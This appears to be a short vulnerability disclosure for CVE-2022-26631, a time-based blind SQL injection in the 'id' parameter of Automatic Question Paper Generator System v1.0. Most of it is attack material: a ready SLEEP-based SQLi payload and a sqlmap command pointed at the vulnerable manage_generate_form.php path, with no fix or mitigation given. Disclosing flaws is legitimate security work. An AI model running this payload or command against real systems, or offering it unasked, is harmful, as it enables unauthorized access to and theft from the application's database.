# CVE-2022-26631
CVE-2022-26631 - Automatic Question Paper Generator v1.0 SQLi

# Description
The `id` GET parameter from Automatic Question Paper Generator System v1.0 appears to be vulnerable to Time-Based Blind SQL injection attacks.

# Payload
An attacker could execute the following SQLi payload in order to gain access to the MySQL database.

`id=1' AND (SELECT 2599 FROM (SELECT(SLEEP(5)))eRGe) AND 'YFLg'='YFLg`

For simplicity, an attacker could automate the exploitation use the tool 'sqlmap' with the following command.

`sqlmap -u 'http://target-url/aqpg/users/question_papers/manage_generate_form.php?id=1' --batch`

